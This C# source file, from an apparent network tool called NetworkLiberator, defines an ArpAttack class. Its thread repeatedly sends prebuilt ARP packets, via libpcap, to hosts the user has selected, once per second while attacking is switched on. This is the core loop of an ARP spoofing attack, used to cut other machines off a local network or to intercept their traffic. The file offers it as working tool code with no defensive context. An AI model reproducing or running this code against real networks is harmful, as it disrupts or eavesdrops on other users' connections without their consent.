using System;
using System.Collections.Generic;
using System.Threading;
using PacketDotNet;

namespace NetworkLiberator.Core
{
	public class ArpAttack
	{
		private Thread m_UpdateThread;
		private bool m_IsAttacking = false;
		private HostManager m_HostManager;

		public ArpAttack(HostManager p_HostManager)
		{
			m_UpdateThread = new Thread(Run);
			m_HostManager = p_HostManager;
		}

		public void Start()
		{
			m_UpdateThread.Start();
		}

		private void Run()
		{
			while (true)
			{
				while (m_IsAttacking)
				{
					List<Packet> l_Packets = new List<Packet>();
					for (var i = 0; i < m_HostManager.Hosts.Count; i++)
					{
						if (m_HostManager.Hosts[i].IsSelected)
							l_Packets.Add(m_HostManager.Hosts[i].ArpPacket);
					}
					Console.WriteLine("Send Packet : " + l_Packets.Count);
					LibPcapHandler.Instance.SendPacket(l_Packets);
					Thread.Sleep(1000);
				}
				Thread.Sleep(2000);
			}
		}

		public bool IsAttacking
		{
			get { return m_IsAttacking; }
			set { m_IsAttacking = value; }
		}
	}
}
